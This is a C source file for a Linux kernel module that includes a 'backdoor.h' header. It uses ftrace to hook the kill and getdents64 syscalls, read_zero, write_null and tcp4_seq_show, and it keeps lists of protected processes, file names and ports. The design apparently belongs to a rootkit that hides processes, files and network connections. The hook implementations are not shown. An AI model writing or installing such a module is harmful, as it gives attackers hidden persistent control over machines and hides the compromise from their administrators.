#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>

#include "backdoor.h"
#include "hook.h"
#include "process.h"
#include "data.h"
#include "file.h"
#include "port.h"


static struct ftrace_hook hooks[] =
        {
                HOOK(HookKill, SYSCALL_NAME("kill")),
                HOOK(HookReadZero, "read_zero"),
                HOOK(HookWriteNull, "write_null"),
                HOOK(HookGetdents64, SYSCALL_NAME("getdents64")),
                HOOK(HookTcp4SeqShow, "tcp4_seq_show")
        };


static struct proc_ops proc_fops = {
        .proc_open = test_open_proc,
        .proc_read = test_read_proc,
        .proc_write = test_write_proc,
        .proc_release = test_release_proc
};


static int __init hello_init(void) {
    pr_info("hello!\n");

//    proc_create("test", 0666, NULL, &proc_fops);

    int i;
    for (i = 0; i < ARRAY_SIZE(hooks); ++i) {
        FtraceHook(&(hooks[i].ops), hooks[i].hook_func_name);
    }

    return 0;
}

static void __exit hello_exit(void) {
    pr_info("hello_exit!\n");

//    remove_proc_entry("test", NULL);

    struct List *entry;
    struct list_head *curr, *next;
    struct list_head *(lists[]) = {&protect_process_list, &filename_list, &port_list};
    int i;
    for (i = 0; i < ARRAY_SIZE(lists); ++i) {
        list_for_each_safe(curr, next, lists[i]) {
            entry = list_entry_rcu(curr, struct List, list);
            list_del_rcu(curr);
            kfree(entry->data);
            kfree(entry);
        }
    }

    for (i = 0; i < ARRAY_SIZE(hooks); ++i) {
        FtraceUnHook(&(hooks[i].ops));
    }
}

module_init(hello_init);
module_exit(hello_exit);
MODULE_LICENSE("GPL");
